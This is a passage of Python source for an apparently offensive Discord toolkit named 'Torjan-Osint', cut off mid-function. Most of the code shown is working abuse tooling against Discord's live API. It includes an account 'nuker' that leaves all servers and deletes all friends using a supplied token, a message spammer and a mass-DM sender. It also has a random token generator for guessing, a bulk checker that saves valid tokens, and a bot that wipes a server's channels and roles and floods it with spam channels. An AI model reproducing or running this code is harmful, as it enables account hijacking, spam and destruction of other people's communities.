# Torjan-Osint V0.1  Coded by @T-D-ORGANIZATION


import os
import sys
import time
import json
import re
import random
import string
import base64
import hashlib
import socket
import subprocess
import threading
import webbrowser
import requests
from datetime import datetime
from urllib.parse import urlparse


        

try:
    from colorama import init, Fore, Back, Style
    init(autoreset=True)
    HAS_COLORAMA = True
except ImportError:
    HAS_COLORAMA = False

try:
    import discord
    HAS_DISCORD = True
except ImportError:
    HAS_DISCORD = False

try:
    from PIL import Image, ExifTags
    HAS_PIL = True
except ImportError:
    HAS_PIL = False

try:
    import phonenumbers
    from phonenumbers import carrier, geocoder, timezone
    HAS_PHONENUMBERS = True
except ImportError:
    HAS_PHONENUMBERS = False

try:
    import whois
    HAS_WHOIS = True
except ImportError:
    HAS_WHOIS = False

try:
    import dns.resolver
    HAS_DNS = True
except ImportError:
    HAS_DNS = False

try:
    import exifread
    HAS_EXIF = True
except ImportError:
    HAS_EXIF = False

try:
    from faker import Faker
    HAS_FAKER = True
except ImportError:
    HAS_FAKER = False

try:
    import luhn
    HAS_LUHN = True
except ImportError:
    HAS_LUHN = False

try:
    from bs4 import BeautifulSoup
    HAS_BS4 = True
except ImportError:
    HAS_BS4 = False

try:
    from tqdm import tqdm
    HAS_TQDM = True
except ImportError:
    HAS_TQDM = False

try:
    import aiohttp
    HAS_AIOHTTP = True
except ImportError:
    HAS_AIOHTTP = False

try:
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad, unpad
    import Crypto.Random
    HAS_CRYPTO = True
except ImportError:
    HAS_CRYPTO = False

try:
    import psutil
    HAS_PSUTIL = True
except ImportError:
    HAS_PSUTIL = False

try:
    from scapy.all import *
    HAS_SCAPY = True
except ImportError:
    HAS_SCAPY = False

try:
    import netifaces
    HAS_NETIFACES = True
except ImportError:
    HAS_NETIFACES = False

try:
    import pyshark
    HAS_PYSHARK = True
except ImportError:
    HAS_PYSHARK = False

try:
    import paramiko
    HAS_PARAMIKO = True
except ImportError:
    HAS_PARAMIKO = False


__version__ = "0.1"
__author__ = "@T-D-ORGANIZATION"
__github__ = "https://github.com/T-D-Organization/Torjan-Osint"  

def check_version():
    """Check for updates on GitHub"""
    try:
        # Don't check if user ignored
        if os.path.exists('.ignore_update'):
            with open('.ignore_update', 'r') as f:
                if f.read().strip() == __version__:
                    return
        
        # Check GitHub for latest release
        api_url = "https://api.github.com/repos/T-D-Organization/Torjan-Osint/releases/latest"
        headers = {'User-Agent': 'Torjan-Osint'}
        
        r = requests.get(api_url, timeout=3, headers=headers)
        
        if r.status_code == 200:
            data = r.json()
            latest = data['tag_name'].replace('v', '')
            
            if latest > __version__:
                print(f"\n{'='*60}")
                print(f"🔴 NEW VERSION AVAILABLE!")
                print(f"{'='*60}")
                print(f"Current: v{__version__}")
                print(f"Latest:  v{latest}")
                print(f"\nWhat's new: {data['name']}")
                print(f"{data['body'][:200]}...")
                print(f"{'='*60}")
                print(f"\n[1] Download Update")
                print(f"[2] Remind Later")
                print(f"[3] Don't Show Again")
                print(f"{'='*60}\n")
                
                choice = input("Select [1/2/3]: ").strip()
                
                if choice == '1':
                    import webbrowser
                    webbrowser.open(data['html_url'])
                    print("Opening download page...")
                    input("Press Enter to continue...")
                elif choice == '3':
                    with open('.ignore_update', 'w') as f:
                        f.write(__version__)
                    print("Won't show again for this version")
                    time.sleep(1)
    except:
        pass  # Silently fail if can't check


# ==================== COLOR SYSTEM ====================
class Colors:
    if HAS_COLORAMA:
        HEADER = Fore.MAGENTA
        BLUE = Fore.BLUE
        CYAN = Fore.CYAN
        GREEN = Fore.GREEN
        YELLOW = Fore.YELLOW
        RED = Fore.RED
        PURPLE = Fore.MAGENTA
        END = Style.RESET_ALL
        BOLD = Style.BRIGHT
        UNDERLINE = '\033[4m'
    else:
        HEADER = '\033[95m'
        BLUE = '\033[94m'
        CYAN = '\033[96m'
        GREEN = '\033[92m'
        YELLOW = '\033[93m'
        RED = '\033[91m'
        PURPLE = '\033[95m'
        END = '\033[0m'
        BOLD = '\033[1m'
        UNDERLINE = '\033[4m'
        BLACK = '\033[0;30m'
        WHITE = '\033[0;37m'
        BG_BLACK = '\033[40m'
        BG_RED = '\033[41m'
        BG_GREEN = '\033[42m'
        BG_YELLOW = '\033[43m'
        BG_BLUE = '\033[44m'
        BG_PURPLE = '\033[45m'
        BG_CYAN = '\033[46m'
        BG_WHITE = '\033[47m'

# ==================== HELPER FUNCTIONS ====================
def clear_screen():
    """Clear terminal screen"""
    os.system('cls' if os.name == 'nt' else 'clear')

def press_enter():
    """Wait for Enter key"""
    input(f"\n{Colors.BLUE}Press Enter to continue...{Colors.END}")

def print_banner():
    """Print main banner"""
    banner = f"""
{Colors.RED}╔═══════════════════════════════════════════════════════════════════════════════╗
║                                                                   
║           {Colors.GREEN}████████╗ ╔██████╗ ██████╗    ██████╗ ╔█████╗ ████    █╗{Colors.RED}
║              {Colors.GREEN}██╔══╝ ██    ██ ██   ██      ██╔═╝ ██╔═╗██ ██╔██   █║{Colors.RED}
║              {Colors.GREEN}██║    ██    ██ ██████═╗     ██║   ███████ ██║╔██  █║{Colors.RED}
║              {Colors.GREEN}██║    ██    ██ ██╔══██║ ██  ██║   ██╔═╗██ ██║╚╝██ █║{Colors.RED}
║              {Colors.GREEN}██║    ╚██████╝ ██║  ██║ ╚████═╝   ██║ ║██ ██║  ╔███║{Colors.RED}
║              {Colors.GREEN}╚═╝     ╚════╝  ╚═╝  ╚═╝  ╚══╝     ╚═╝ ╚═╝ ╚═╝  ╚═══╝{Colors.RED}
║
║                                     {Colors.CYAN}OSINT{Colors.CYAN}
║
║                                {Colors.CYAN}{Colors.BOLD}Torjan-Osint V0.1{Colors.RED}       
║                            {Colors.YELLOW}Cᴏᴅᴇᴅ ʙʏ @T-D-Organization{Colors.RED}               
║                          {Colors.PURPLE} Torjan-Osint MULTI-TOOLS V0.1{Colors.RED}          
║                                                                              
╚═══════════════════════════════════════════════════════════════════════════════╝{Colors.END}
"""
    print(banner)

def print_section(title):
    """Print section header"""
    print(f"\n{Colors.CYAN}╔═══════════════════════════════════════════════════════════════╗{Colors.END}")
    print(f"{Colors.CYAN}║{Colors.BOLD}{Colors.GREEN}{title:^67}{Colors.END}{Colors.CYAN}║{Colors.END}")
    print(f"{Colors.CYAN}╚═══════════════════════════════════════════════════════════════╝{Colors.END}\n")

def load_config():
    """Load configuration from config.json"""
    try:
        with open('config.json', 'r') as f:
            return json.load(f)
    except:
        return {
            "webhook_url": "",
            "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "timeout": 10,
            "max_retries": 3,
            "save_output": True,
            "theme": "dark"
        }

# ==================== DISCORD TOKEN TOOLS ====================
class DiscordTokenTools:
    @staticmethod
    def menu():
        while True:
            clear_screen()
            print_section("DISCORD TOKEN TOOLS")
            
            options = {
                '1': 'Token Info Checker',
                '2': 'Token Nuker',
                '3': 'Join/Leave Server',
                '4': 'ID Extractor',
                '5': 'Spammer Tool',
                '6': 'Mass DM',
                '7': 'Delete/Ban Friends',
                '8': 'Token Generator',
                '9': 'Bulk Token Checker',
                '10': 'Token Formatter',
                '99': 'Back to Main Menu'
            }
            
            for key, value in options.items():
                print(f"{Colors.GREEN}[{key:>2}]{Colors.END}  {value}")
            
            choice = input(f"\n{Colors.BLUE}[?] Select option ➔ {Colors.END}").strip()
            
            if choice == '99':
                break
            elif choice == '1':
                DiscordTokenTools.token_info()
            elif choice == '2':
                DiscordTokenTools.token_nuker()
            elif choice == '3':
                DiscordTokenTools.join_leave_server()
            elif choice == '4':
                DiscordTokenTools.id_extractor()
            elif choice == '5':
                DiscordTokenTools.spammer_tool()
            elif choice == '6':
                DiscordTokenTools.mass_dm()
            elif choice == '7':
                DiscordTokenTools.delete_friends()
            elif choice == '8':
                DiscordTokenTools.token_generator()
            elif choice == '9':
                DiscordTokenTools.bulk_token_checker()
            elif choice == '10':
                DiscordTokenTools.token_formatter()
            else:
                print(f"{Colors.RED}[!] Invalid option{Colors.END}")
                time.sleep(1)
    
    @staticmethod
    def token_info():
        clear_screen()
        print_section("TOKEN INFO CHECKER")
        
        token = input(f"{Colors.GREEN}[?] Enter Discord Token: {Colors.END}").strip()
        
        if not token:
            print(f"{Colors.RED}[!] No token provided{Colors.END}")
            press_enter()
            return
        
        headers = {'Authorization': token}
        
        try:
            r = requests.get('https://discord.com/api/v9/users/@me', headers=headers)
            
            if r.status_code == 200:
                user = r.json()
                
                print(f"\n{Colors.GREEN}[✓] Token Valid!{Colors.END}")
                print(f"\n{Colors.CYAN}═══════════ USER INFO ═══════════{Colors.END}")
                print(f"{Colors.GREEN}Username: {Colors.END}{user.get('username')}#{user.get('discriminator')}")
                print(f"{Colors.GREEN}ID: {Colors.END}{user.get('id')}")
                print(f"{Colors.GREEN}Email: {Colors.END}{user.get('email', 'No email')}")
                print(f"{Colors.GREEN}Phone: {Colors.END}{user.get('phone', 'No phone')}")
                print(f"{Colors.GREEN}MFA Enabled: {Colors.END}{user.get('mfa_enabled')}")
                print(f"{Colors.GREEN}Verified: {Colors.END}{user.get('verified')}")
                
                # Get guilds
                r2 = requests.get('https://discord.com/api/v9/users/@me/guilds', headers=headers)
                if r2.status_code == 200:
                    guilds = r2.json()
                    print(f"{Colors.GREEN}Servers: {Colors.END}{len(guilds)}")
                
                # Save to file
                filename = f"token_info_{user['id']}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
                with open(filename, 'w') as f:
                    f.write(f"Token: {token}\n")
                    f.write(f"User: {user.get('username')}#{user.get('discriminator')}\n")
                    f.write(f"ID: {user.get('id')}\n")
                    f.write(f"Email: {user.get('email', 'N/A')}\n")
                    f.write(f"Phone: {user.get('phone', 'N/A')}\n")
                
                print(f"\n{Colors.GREEN}[✓] Info saved to {filename}{Colors.END}")
            else:
                print(f"{Colors.RED}[!] Invalid Token (Status: {r.status_code}){Colors.END}")
        
        except Exception as e:
            print(f"{Colors.RED}[!] Error: {e}{Colors.END}")
        
        press_enter()
    
    @staticmethod
    def token_nuker():
        clear_screen()
        print_section("TOKEN NUKER")
        
        print(f"{Colors.RED}[!] WARNING: This will destroy the account!{Colors.END}")
        token = input(f"{Colors.GREEN}[?] Enter Discord Token: {Colors.END}").strip()
        
        confirm = input(f"{Colors.RED}[?] Type 'NUKE' to confirm: {Colors.END}").strip()
        if confirm != 'NUKE':
            print(f"{Colors.YELLOW}[*] Operation cancelled{Colors.END}")
            press_enter()
            return
        
        headers = {'Authorization': token}
        
        try:
            print(f"{Colors.CYAN}[*] Starting nuke sequence...{Colors.END}")
            
            # Leave all servers
            r = requests.get('https://discord.com/api/v9/users/@me/guilds', headers=headers)
            if r.status_code == 200:
                guilds = r.json()
                for guild in guilds:
                    try:
                        requests.delete(f'https://discord.com/api/v9/users/@me/guilds/{guild["id"]}', headers=headers)
                        print(f"{Colors.GREEN}[✓] Left: {guild['name']}{Colors.END}")
                        time.sleep(0.5)
                    except:
                        pass
            
            # Delete all friends
            r = requests.get('https://discord.com/api/v9/users/@me/relationships', headers=headers)
            if r.status_code == 200:
                friends = r.json()
                for friend in friends:
                    try:
                        requests.delete(f'https://discord.com/api/v9/users/@me/relationships/{friend["id"]}', headers=headers)
                        print(f"{Colors.GREEN}[✓] Removed friend: {friend['user']['username']}{Colors.END}")
                        time.sleep(0.5)
                    except:
                        pass
            
            # Change settings
            settings = {
                'theme': 'dark',
                'locale': 'en-US',
                'message_display_compact': False
            }
            requests.patch('https://discord.com/api/v9/users/@me/settings', headers=headers, json=settings)
            
            print(f"\n{Colors.GREEN}[✓] Nuke completed! Account is destroyed.{Colors.END}")
            
        except Exception as e:
            print(f"{Colors.RED}[!] Error: {e}{Colors.END}")
        
        press_enter()
    
    @staticmethod
    def join_leave_server():
        clear_screen()
        print_section("JOIN/LEAVE SERVER")
        
        token = input(f"{Colors.GREEN}[?] Enter Discord Token: {Colors.END}").strip()
        
        print(f"\n{Colors.CYAN}[1] Join Server{Colors.END}")
        print(f"{Colors.CYAN}[2] Leave Server{Colors.END}")
        print(f"{Colors.CYAN}[3] Mass Leave{Colors.END}")
        
        choice = input(f"\n{Colors.BLUE}[?] Select: {Colors.END}").strip()
        
        headers = {'Authorization': token}
        
        if choice == '1':
            invite = input(f"{Colors.GREEN}[?] Invite Code/Link: {Colors.END}").strip()
            if 'discord.gg/' in invite:
                invite = invite.split('discord.gg/')[1]
            elif 'discord.com/invite/' in invite:
                invite = invite.split('discord.com/invite/')[1]
            
            try:
                r = requests.post(f'https://discord.com/api/v9/invites/{invite}', headers=headers)
                if r.status_code == 200:
                    print(f"{Colors.GREEN}[✓] Joined server successfully!{Colors.END}")
                else:
                    print(f"{Colors.RED}[!] Failed to join (Status: {r.status_code}){Colors.END}")
            except Exception as e:
                print(f"{Colors.RED}[!] Error: {e}{Colors.END}")
        
        elif choice == '2':
            server_id = input(f"{Colors.GREEN}[?] Server ID: {Colors.END}").strip()
            try:
                r = requests.delete(f'https://discord.com/api/v9/users/@me/guilds/{server_id}', headers=headers)
                if r.status_code == 204:
                    print(f"{Colors.GREEN}[✓] Left server successfully!{Colors.END}")
                else:
                    print(f"{Colors.RED}[!] Failed to leave (Status: {r.status_code}){Colors.END}")
            except Exception as e:
                print(f"{Colors.RED}[!] Error: {e}{Colors.END}")
        
        elif choice == '3':
            confirm = input(f"{Colors.RED}[?] Leave ALL servers? (yes/no): {Colors.END}").strip()
            if confirm.lower() == 'yes':
                try:
                    r = requests.get('https://discord.com/api/v9/users/@me/guilds', headers=headers)
                    if r.status_code == 200:
                        guilds = r.json()
                        for guild in guilds:
                            try:
                                requests.delete(f'https://discord.com/api/v9/users/@me/guilds/{guild["id"]}', headers=headers)
                                print(f"{Colors.GREEN}[✓] Left: {guild['name']}{Colors.END}")
                                time.sleep(0.5)
                            except:
                                pass
                        print(f"{Colors.GREEN}[✓] Left {len(guilds)} servers{Colors.END}")
                except Exception as e:
                    print(f"{Colors.RED}[!] Error: {e}{Colors.END}")
        
        press_enter()
    
    @staticmethod
    def id_extractor():
        clear_screen()
        print_section("ID EXTRACTOR")
        
        token = input(f"{Colors.GREEN}[?] Enter Discord Token: {Colors.END}").strip()
        
        headers = {'Authorization': token}
        
        try:
            # Get user ID
            r = requests.get('https://discord.com/api/v9/users/@me', headers=headers)
            if r.status_code == 200:
                user = r.json()
                user_id = user['id']
                
                print(f"\n{Colors.CYAN}═══════════ YOUR INFO ═══════════{Colors.END}")
                print(f"{Colors.GREEN}User ID: {Colors.END}{user_id}")
                print(f"{Colors.GREEN}Username: {Colors.END}{user.get('username')}#{user.get('discriminator')}")
                
                # Calculate account age
                timestamp = (int(user_id) >> 22) + 1420070400000
                date = datetime.fromtimestamp(timestamp/1000)
                print(f"{Colors.GREEN}Account Created: {Colors.END}{date.strftime('%Y-%m-%d %H:%M:%S')}")
                print(f"{Colors.GREEN}Account Age: {Colors.END}{(datetime.now() - date).days} days")
            
            # Get server IDs
            r = requests.get('https://discord.com/api/v9/users/@me/guilds', headers=headers)
            if r.status_code == 200:
                guilds = r.json()
                print(f"\n{Colors.CYAN}═══════════ SERVER IDS ({len(guilds)}) ═══════════{Colors.END}")
                for guild in guilds[:10]:
                    print(f"{Colors.GREEN}{guild['name']}: {Colors.END}{guild['id']}")
            
            # Get friend IDs
            r = requests.get('https://discord.com/api/v9/users/@me/relationships', headers=headers)
            if r.status_code == 200:
                friends = r.json()
                print(f"\n{Colors.CYAN}═══════════ FRIEND IDS ({len(friends)}) ═══════════{Colors.END}")
                for friend in friends[:10]:
                    user = friend['user']
                    print(f"{Colors.GREEN}{user['username']}#{user['discriminator']}: {Colors.END}{user['id']}")
            
        except Exception as e:
            print(f"{Colors.RED}[!] Error: {e}{Colors.END}")
        
        press_enter()
    
    @staticmethod
    def spammer_tool():
        clear_screen()
        print_section("SPAMMER TOOL")
        
        token = input(f"{Colors.GREEN}[?] Enter Discord Token: {Colors.END}").strip()
        channel_id = input(f"{Colors.GREEN}[?] Channel ID: {Colors.END}").strip()
        message = input(f"{Colors.GREEN}[?] Message to spam: {Colors.END}").strip()
        
        try:
            count = int(input(f"{Colors.GREEN}[?] Number of messages: {Colors.END}").strip())
            delay = float(input(f"{Colors.GREEN}[?] Delay (seconds): {Colors.END}").strip())
        except:
            count = 10
            delay = 1
        
        headers = {'Authorization': token, 'Content-Type': 'application/json'}
        
        print(f"\n{Colors.CYAN}[*] Starting spam...{Colors.END}")
        
        success = 0
        for i in range(count):
            try:
                data = {'content': message}
                r = requests.post(f'https://discord.com/api/v9/channels/{channel_id}/messages', 
                                headers=headers, json=data)
                
                if r.status_code == 200:
                    success += 1
                    print(f"{Colors.GREEN}[✓] Message {i+1}/{count} sent{Colors.END}")
                else:
                    print(f"{Colors.RED}[!] Failed: {r.status_code}{Colors.END}")
                
                time.sleep(delay)
            except Exception as e:
                print(f"{Colors.RED}[!] Error: {e}{Colors.END}")
                break
        
        print(f"\n{Colors.GREEN}[✓] Spam complete! {success}/{count} messages sent{Colors.END}")
        press_enter()
    
    @staticmethod
    def mass_dm():
        clear_screen()
        print_section("MASS DM")
        
        print(f"{Colors.RED}[!] WARNING: This may get your account banned{Colors.END}")
        token = input(f"{Colors.GREEN}[?] Enter Discord Token: {Colors.END}").strip()
        message = input(f"{Colors.GREEN}[?] Message to send: {Colors.END}").strip()
        
        headers = {'Authorization': token}
        
        try:
            # Get friends list
            r = requests.get('https://discord.com/api/v9/users/@me/relationships', headers=headers)
            if r.status_code != 200:
                print(f"{Colors.RED}[!] Failed to get friends list{Colors.END}")
                press_enter()
                return
            
            friends = r.json()
            print(f"{Colors.CYAN}[*] Found {len(friends)} friends{Colors.END}")
            
            confirm = input(f"{Colors.RED}[?] Send to all? (yes/no): {Colors.END}").strip()
            if confirm.lower() != 'yes':
                return
            
            success = 0
            for friend in friends:
                try:
                    user_id = friend['id']
                    
                    # Create DM channel
                    dm_data = {'recipient_id': user_id}
                    r = requests.post('https://discord.com/api/v9/users/@me/channels', 
                                    headers=headers, json=dm_data)
                    
                    if r.status_code == 200:
                        channel_id = r.json()['id']
                        
                        # Send message
                        msg_data = {'content': message}
                        r = requests.post(f'https://discord.com/api/v9/channels/{channel_id}/messages',
                                        headers=headers, json=msg_data)
                        
                        if r.status_code == 200:
                            success += 1
                            print(f"{Colors.GREEN}[✓] Sent to {friend['user']['username']}{Colors.END}")
                        else:
                            print(f"{Colors.RED}[!] Failed to send to {friend['user']['username']}{Colors.END}")
                    
                    time.sleep(1)
                    
                except Exception as e:
                    print(f"{Colors.RED}[!] Error: {e}{Colors.END}")
            
            print(f"\n{Colors.GREEN}[✓] DM complete! Sent to {success}/{len(friends)} friends{Colors.END}")
            
        except Exception as e:
            print(f"{Colors.RED}[!] Error: {e}{Colors.END}")
        
        press_enter()
    
    @staticmethod
    def delete_friends():
        clear_screen()
        print_section("DELETE/BAN FRIENDS")
        
        token = input(f"{Colors.GREEN}[?] Enter Discord Token: {Colors.END}").strip()
        
        print(f"\n{Colors.CYAN}[1] Delete all friends{Colors.END}")
        print(f"{Colors.CYAN}[2] Block all friends{Colors.END}")
        
        choice = input(f"\n{Colors.BLUE}[?] Select: {Colors.END}").strip()
        
        headers = {'Authorization': token}
        
        try:
            r = requests.get('https://discord.com/api/v9/users/@me/relationships', headers=headers)
            if r.status_code != 200:
                print(f"{Colors.RED}[!] Failed to get friends list{Colors.END}")
                press_enter()
                return
            
            friends = r.json()
            
            if choice == '1':
                for friend in friends:
                    try:
                        requests.delete(f'https://discord.com/api/v9/users/@me/relationships/{friend["id"]}', 
                                      headers=headers)
                        print(f"{Colors.GREEN}[✓] Deleted: {friend['user']['username']}{Colors.END}")
                        time.sleep(0.5)
                    except:
                        pass
            
            elif choice == '2':
                for friend in friends:
                    try:
                        block_data = {'type': 2}  # Block relationship
                        requests.put(f'https://discord.com/api/v9/users/@me/relationships/{friend["id"]}', 
                                   headers=headers, json=block_data)
                        print(f"{Colors.GREEN}[✓] Blocked: {friend['user']['username']}{Colors.END}")
                        time.sleep(0.5)
                    except:
                        pass
            
            print(f"{Colors.GREEN}[✓] Operation complete!{Colors.END}")
            
        except Exception as e:
            print(f"{Colors.RED}[!] Error: {e}{Colors.END}")
        
        press_enter()
    
    @staticmethod
    def token_generator():
        clear_screen()
        print_section("TOKEN GENERATOR")
        
        try:
            count = int(input(f"{Colors.GREEN}[?] How many tokens to generate: {Colors.END}").strip())
        except:
            count = 10
        
        tokens = []
        for _ in range(count):
            part1 = ''.join(random.choices(string.ascii_letters + string.digits, k=24))
            part2 = ''.join(random.choices(string.ascii_letters + string.digits, k=6))
            part3 = ''.join(random.choices(string.ascii_letters + string.digits + '-_', k=27))
            token = f"{part1}.{part2}.{part3}"
            tokens.append(token)
        
        filename = f"generated_tokens_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        with open(filename, 'w') as f:
            f.write('\n'.join(tokens))
        
        print(f"\n{Colors.GREEN}[✓] Generated {count} tokens{Colors.END}")
        print(f"{Colors.GREEN}[✓] Saved to {filename}{Colors.END}")
        
        # Show first 5
        print(f"\n{Colors.CYAN}Sample tokens:{Colors.END}")
        for token in tokens[:5]:
            print(f"{Colors.GREEN}  {token}{Colors.END}")
        
        press_enter()
    
    @staticmethod
    def bulk_token_checker():
        clear_screen()
        print_section("BULK TOKEN CHECKER")
        
        file_path = input(f"{Colors.GREEN}[?] Path to token list file: {Colors.END}").strip()
        
        try:
            with open(file_path, 'r') as f:
                tokens = [line.strip() for line in f if line.strip()]
            
            print(f"{Colors.CYAN}[*] Checking {len(tokens)} tokens...{Colors.END}\n")
            
            valid = []
            invalid = []
            
            for i, token in enumerate(tokens, 1):
                print(f"{Colors.CYAN}[*] Checking token {i}/{len(tokens)}{Colors.END}", end='\r')
                
                headers = {'Authorization': token}
                try:
                    r = requests.get('https://discord.com/api/v9/users/@me', headers=headers, timeout=5)
                    
                    if r.status_code == 200:
                        user = r.json()
                        valid.append({
                            'token': token,
                            'username': f"{user.get('username')}#{user.get('discriminator')}",
                            'id': user.get('id')
                        })
                        print(f"{Colors.GREEN}[✓] Valid: {user.get('username')}{Colors.END}")
                    else:
                        invalid.append(token)
                except:
                    invalid.append(token)
                
                time.sleep(0.1)
            
            print(f"\n\n{Colors.GREEN}[✓] Results:{Colors.END}")
            print(f"{Colors.GREEN}  Valid: {len(valid)}{Colors.END}")
            print(f"{Colors.GREEN}  Invalid: {len(invalid)}{Colors.END}")
            
            if valid:
                valid_file = f"valid_tokens_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
                with open(valid_file, 'w') as f:
                    for v in valid:
                        f.write(f"Token: {v['token']}\n")
                        f.write(f"User: {v['username']}\n")
                        f.write(f"ID: {v['id']}\n")
                        f.write("-" * 50 + "\n")
                
                print(f"{Colors.GREEN}[✓] Valid tokens saved to {valid_file}{Colors.END}")
            
        except Exception as e:
            print(f"{Colors.RED}[!] Error: {e}{Colors.END}")
        
        press_enter()
    
    @staticmethod
    def token_formatter():
        clear_screen()
        print_section("TOKEN FORMATTER")
        
        file_path = input(f"{Colors.GREEN}[?] Path to token list file: {Colors.END}").strip()
        
        try:
            with open(file_path, 'r') as f:
                tokens = [line.strip() for line in f if line.strip()]
            
            # Clean tokens
            cleaned = []
            for token in tokens:
                token = token.strip().strip('"').strip("'")
                if token.count('.') == 2:
                    cleaned.append(token)
            
            # Remove duplicates
            cleaned = list(set(cleaned))
            
            # Save different formats
            base_name = f"formatted_tokens_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
            
            # Format 1: One per line
            with open(f"{base_name}_per_line.txt", 'w') as f:
                f.write('\n'.join(cleaned))
            
            # Format 2: Comma separated
            with open(f"{base_name}_comma.txt", 'w') as f:
                f.write(','.join(cleaned))
            
            # Format 3: JSON array
            with open(f"{base_name}_json.json", 'w') as f:
                json.dump(cleaned, f, indent=2)
            
            print(f"\n{Colors.GREEN}[✓] Formatted tokens saved:{Colors.END}")
            print(f"{Colors.GREEN}  - {base_name}_per_line.txt{Colors.END}")
            print(f"{Colors.GREEN}  - {base_name}_comma.txt{Colors.END}")
            print(f"{Colors.GREEN}  - {base_name}_json.json{Colors.END}")
            
            print(f"\n{Colors.CYAN}Stats:{Colors.END}")
            print(f"{Colors.GREEN}  Original: {len(tokens)}{Colors.END}")
            print(f"{Colors.GREEN}  Valid: {len(cleaned)}{Colors.END}")
            print(f"{Colors.GREEN}  Removed: {len(tokens) - len(cleaned)}{Colors.END}")
            
        except Exception as e:
            print(f"{Colors.RED}[!] Error: {e}{Colors.END}")
        
        press_enter()

# ==================== DISCORD BOT TOOLS ====================
class DiscordBotTools:
    @staticmethod
    def menu():
        while True:
            clear_screen()
            print_section("DISCORD BOT TOOLS")
            
            options = {
                '1': 'Server Nuker Bot',
                '2': 'Invite Generator',
                '3': 'Bot Info Grabber',
                '4': 'Bot Token Checker',
                '5': 'Permissions Calculator',
                '99': 'Back to Main Menu'
            }
            
            for key, value in options.items():
                print(f"{Colors.GREEN}[{key:>2}]{Colors.END}  {value}")
            
            choice = input(f"\n{Colors.BLUE}[?] Select option ➔ {Colors.END}").strip()
            
            if choice == '99':
                break
            elif choice == '1':
                DiscordBotTools.server_nuker_bot()
            elif choice == '2':
                DiscordBotTools.invite_generator()
            elif choice == '3':
                DiscordBotTools.bot_info_grabber()
            elif choice == '4':
                DiscordBotTools.bot_token_checker()
            elif choice == '5':
                DiscordBotTools.permissions_calculator()
            else:
                print(f"{Colors.RED}[!] Invalid option{Colors.END}")
                time.sleep(1)
    
    @staticmethod
    def server_nuker_bot():
        clear_screen()
        print_section("SERVER NUKER BOT")
        
        print(f"{Colors.RED}[!] WARNING: This will destroy the server!{Colors.END}")
        token = input(f"{Colors.GREEN}[?] Bot Token: {Colors.END}").strip()
        guild_id = input(f"{Colors.GREEN}[?] Server ID: {Colors.END}").strip()
        
        headers = {'Authorization': f'Bot {token}'}
        
        try:
            print(f"{Colors.CYAN}[*] Starting nuke sequence...{Colors.END}")
            
            # Delete all channels
            print(f"{Colors.CYAN}[*] Deleting channels...{Colors.END}")
            r = requests.get(f'https://discord.com/api/v9/guilds/{guild_id}/channels', headers=headers)
            if r.status_code == 200:
                channels = r.json()
                for channel in channels:
                    try:
                        requests.delete(f'https://discord.com/api/v9/channels/{channel["id"]}', headers=headers)
                        print(f"{Colors.GREEN}[✓] Deleted: {channel['name']}{Colors.END}")
                        time.sleep(0.3)
                    except:
                        pass
            
            # Delete all roles
            print(f"{Colors.CYAN}[*] Deleting roles...{Colors.END}")
            r = requests.get(f'https://discord.com/api/v9/guilds/{guild_id}/roles', headers=headers)
            if r.status_code == 200:
                roles = r.json()
                for role in roles:
                    if role['name'] != '@everyone':
                        try:
                            requests.delete(f'https://discord.com/api/v9/guilds/{guild_id}/roles/{role["id"]}', 
                                          headers=headers)
                            print(f"{Colors.GREEN}[✓] Deleted role: {role['name']}{Colors.END}")
                            time.sleep(0.3)
                        except:
                            pass
            
            # Create spam channels
            print(f"{Colors.CYAN}[*] Creating spam channels...{Colors.END}")
            for i in range(20):
                try:
                    channel_data = {'name': f'nuked-{i}', 'type': 0}
                    requests.post(f'https://discord.com/api/v9/guilds/{guild_id}/channels', 
                                headers=headers, json=channel_data)
                    print(f"{Colors.GREEN}[✓] Created channel nuked-{i}{Colors.END}")
                except:
                    pass
            
            # Change server name
            guild_data = {'name': 'NUKED BY EREBUS', 'icon': None}
            requests.patch(f'https://discord.com/api/v9/guilds/{guild_id}', headers=headers, json=guild_data)
            
            print(f"\n{Colors.GREEN}[✓] Server nuked successfully!{Colors.END}")
            
        except Exception as e:
            print(f"{Colors.RED}[!] Error: {e}{Colors.END}")
        
        press_enter()
    
    @staticmethod
    def invite_generator():
        clear_screen()
        print_section("INVITE GENERATOR")
        
        token = input(f"{Colors.GREEN}[?] Bot Token: {Colors.END}").strip()
        
        permissions = {
            'Administrator': 8,
            'Manage Server': 32,
            'Manage Channels': 16,
            'Manage Messages': 8192,
            'Ban Members': 4,
            'Kick Members': 2,
            'Manage Webhooks': 536870912
        }
        
        print(f"\n{Colors.CYAN}Select permissions:{Colors.END}")
        selected_perms = 0
        
        perms_list = list(permissions.items())
        for i, (perm_name, perm_value) in enumerate(perms_list, 1):
            print(f"{Colors.GREEN}[{i}]{Colors.END} {perm_name}")
        
        perms_input = input(f"\n{Colors.BLUE}[?] Enter permission numbers (comma separated): {Colors.END}").strip()
        
        if perms_input:
            for num in perms_input.split(','):
                try:
                    idx = int(num.strip()) - 1
                    if 0 <= idx < len(perms_list):
                        selected_perms += perms_list[idx][1]
                except:
                    pass
        
        # Get bot info
        headers = {'Authorization': f'Bot {token}'}
        r = requests.get('https://discord.com/api/v9/users/@me', headers=headers)
        
        if r.status_code == 200:
            bot = r.json()
            bot_id = bot['id']
            
            invite_url = f"https://discord.com/api/oauth2/authorize?client_id={bot_id}&permissions={selected_perms}&scope=bot"
            
            print(f"\n{Colors.GREEN}[✓] Bot Invite URL:{Colors.END}")
            print(f"{Colors.CYAN}{invite_url}{Colors.END}")
            
            with open(f"bot_invite_{bot_id}.txt", 'w') as f:
                f.write(invite_url)
            
            print(f"{Colors.GREEN}[✓] Saved to bot_invite_{bot_id}.txt{Colors.END}")
        else:
            print(f"{Colors.RED}[!] Invalid bot token{Colors.END}")
        
        press_enter()
    
    @staticmethod
    def bot_info_grabber():
        clear_screen()
        print_section("BOT INFO GRABBER")
        
        token = input(f"{Colors.GREEN}[?] Bot Token: {Colors.END}").strip()
        
        headers = {'Authorization': f'Bot {token}'}
        
        try:
            r = requests.get('https://discord.com/api/v9/users/@me', headers=headers)
            
            if r.status_code == 200:
                bot = r.json()
                
                print(f"\n{Colors.CYAN}═══════════ BOT INFO ═══════════{Colors.END}")
